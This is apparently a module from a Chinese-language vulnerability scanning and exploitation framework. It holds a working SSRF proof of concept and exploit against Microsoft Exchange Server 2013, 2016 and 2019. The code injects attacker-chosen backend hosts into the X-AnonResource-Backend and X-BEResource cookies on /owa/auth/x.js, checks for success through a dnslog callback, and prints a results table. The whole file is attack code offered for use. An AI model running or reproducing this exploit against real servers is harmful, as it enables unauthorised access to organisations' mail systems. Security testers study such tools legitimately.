from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
from operator import methodcaller
from ClassCongregation import Dnslog
import prettytable as pt
import requests,re
import CodeTest
################
##--Exchange--##
#Exchange_SSRF  [ssrf]，默认VULN = None
################
VULN = ''
TIMEOUT = ''
DL = Dnslog() #申请dnslog地址
class Exchange():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
            
    def _Exchange_SSRF(self):
        self.pocname = "Exchange:Exchange_SSRF"
        self.method = "get"
        self.rawdata = "null"
        self.info = "[ssrf]"
        self.r = "PoCWating"

        self.path = "/owa/auth/x.js"
        self.data = ""
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Cookie': 'X-AnonResource=true;X-AnonResource-Backend={}/ecp/default.flt?~3;X-BEResource={}/owa/auth/logon.aspx?~3;'.format(self.CMD,self.CMD)}
        try:
            if VULN == 'False':
                self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                if DL.result():
                    self.r = "PoCSuCCeSS"
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.get(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

tb = pt.PrettyTable()
tb.field_names = ["Target type", "Vuln Name", "Poc", "Exp", "Impact Version && Vulnerability description"]
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
print_result = ("Exchange", "Exchange_SSRF" ,"N" ,"Y" ,"Exchange Server 2013、Exchange Server 2016、Exchange Server 2019, [ssrf]")
tb.add_row(print_result)
print(tb)

def check(**kwargs):
    global VULN,TIMEOUT
    VULN = kwargs['vuln']
    TIMEOUT = int(kwargs['timeout'])
    CodeTest.Verification.CMD = kwargs['cmd']
    CodeTest.Verification.VULN = kwargs['vuln']
    if VULN == 'False':
        ExpExchange = Exchange(_urlparse(kwargs['url']),DL.dns_host())
    else:
        ExpExchange = Exchange(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] != "ALL":
        func = getattr(ExpExchange, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(Exchange):
            if not func.startswith("__"):
                methodcaller(func)(ExpExchange)